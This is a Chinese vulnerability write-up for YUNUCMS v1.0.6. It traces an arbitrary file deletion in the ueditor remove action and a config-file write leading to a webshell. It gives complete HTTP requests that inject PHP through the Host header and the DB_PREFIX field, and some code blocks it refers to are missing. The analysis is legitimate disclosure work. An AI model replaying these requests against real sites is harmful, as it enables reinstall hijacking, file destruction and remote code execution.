@@ -1,0 +1,42 @@
+任意文件删除漏洞
+0x00 相关环境
+源码信息：YUNUCMSv1.0.6
+问题文件： \YUNUCMSv1.0.6\statics\ueditor\php\vendor\Local.class.php
+漏洞类型：任意文件删除漏洞
+站点地址：http://www.yunucms.com/
+0x01 漏洞分析
+在文件\YUNUCMSv1.0.6\statics\ueditor\php\vendor\Local.class.php的第34-57行中发现如下代码块，remove方法中使用POST接收key参数的值然后进行路径拼接再传入unlink函数中，未进行任何安全处理，存在任意文件删除漏洞。
+追溯remove方法被调用的过程，在\YUNUCMSv1.0.6\statics\ueditor\php\controller.php文件中发现如下代码块，根据注释可知是实例化处理的方法的代码。
+继续追溯dispatcher方法，在\YUNUCMSv1.0.6\statics\ueditor\php\vendor\Channel.class.php文件的第33-40行中发现如下代码块，使用call_user_func函数回调对应的方法。
+在\YUNUCMSv1.0.6\statics\ueditor\php\controller.php文件的24-39行中，使用如下代码进行函数和方法的注册，并包含相应的class文件，具体包含了：Channel.class.php，Local.class.php，Base.class.php这3个文件，而remove方法就在Local.class.php文件中，因此可以使用这个入口调用remove方法。
+0x02 漏洞复现
+该漏洞可以进行任意文件删除，如下通过删除install.lock文件为例子进行说明，通过删除install.lock可以进行源码重装，此处为了方便查看引入的class文件在\YUNUCMSv1.0.6\statics\ueditor\php\controller.php文件的第30行中加入如下代码。
+使用如下请求可以删除install.lock文件，从而可以进行源码重装。
+POST /statics/ueditor/php/controller.php?action=remove HTTP/1.1 Host: 127.0.0.1 User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0 Accept: application/json, text/javascript, */*; q=0.01 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded; charset=UTF-8 X-Requested-With: XMLHttpRequest Referer: [http://127.0.0.1/statics/ueditor/dialogs/attachment/attachment.html](http://127.0.0.1/statics/ueditor/dialogs/attachment/attachment.html) Content-Length: 22 Connection: close key=/data/install.lock
+配置文件写入导致GetShell
+0x00 相关环境
+源码信息： YUNUCMSv1.0.6
+问题文件： \YUNUCMSv1.0.6\app\index\controller\Install.php
+漏洞类型：配置文件写入导致GetShell
+站点地址：http://www.yunucms.com/
+0x01 漏洞分析
+在\YUNUCMSv1.0.6\app\index\controller\Install.php的第126-127行中使用$_SERVER['HTTP_HOST']接收http请求中的host字段的值，然后传入到setConfigfile方法中。
+在\YUNUCMSv1.0.6\app\index\controller\Install.php的第96-105行中也是存在类似的问题。
+跟入setConfigfile方法，在\YUNUCMSv1.0.6\app\admin\common.php文件的第467-474行中得到如下代码块，使用了file_put_contents将传入的参数进行拆分并写入相应的文件。
+因此\YUNUCMSv1.0.6\app\index\controller\Install.php的第126-127行中使用$_SERVER['HTTP_HOST']将会被写入到sys.php文件中，\YUNUCMSv1.0.6\app\index\controller\Install.php的第96-105行的数据会被写入到database.php文件中，但是传入的参数是数据库的一些配置文件，所以要修改成PHP代码有一点的限制，但是也是可行的，如在DB_PREFIX位置上写入PHP代码。
+0x02 漏洞复现
+情况一：通过修改host字段的值将PHP代码写入到sys.php文件中.
+1.修改请求中的host字段的值为PHP代码。
+POST /index.php/index/install/setup3 HTTP/1.1 Host: ',].die(fwrite(fopen("evil.php", "w"), "<?php phpinfo();?>"));$a=['a'=>' User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 87 Referer: [http://127.0.0.1/index.php/index/install/setup2](http://127.0.0.1/index.php/index/install/setup2) Connection: close Upgrade-Insecure-Requests: 1 Cache-Control: max-age=0 DB_HOST=127.0.0.1&DB_PORT=3306&DB_NAME=yunucms&DB_USER=root&DB_PWD=root&DB_PREFIX=yunu_
+2.提交后sys.php文件内容被修改成如下内容。
+3.访问sys.php文件，便会生成evil.php文件 。
+http://127.0.0.1/config/extra/sys.php
+4.访问evil文件可以看到执行的PHP代码 。
+http://127.0.0.1/config/extra/evil.php
+情况二：通过修改DB_PREFIX参数的值将PHP代码写入到database.php文件中。
+1.修改请求中的DB_PREFIX参数的值为PHP代码提交。
+POST /index.php/index/install/setup3 HTTP/1.1 Host: 127.0.0.1 User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 159 Referer: [http://127.0.0.1/index.php/index/install/setup2](http://127.0.0.1/index.php/index/install/setup2) Connection: close Upgrade-Insecure-Requests: 1 DB_HOST=127.0.0.1&DB_PORT=3306&DB_NAME=yunucms&DB_USER=root&DB_PWD=root&DB_PREFIX=yunu_',].die(fwrite(fopen("evil.php", "w"), "<?php phpinfo();?>"));$a=['a'=>'
+2.提交后POST请求后database.php文件中的内容被修改成如下代码。
+3.提交后访问database.php文件便会生成evil.php的文件 。
+http://127.0.0.1/config/database.php
+4.访问evil.php可以看到执行的PHP代码。
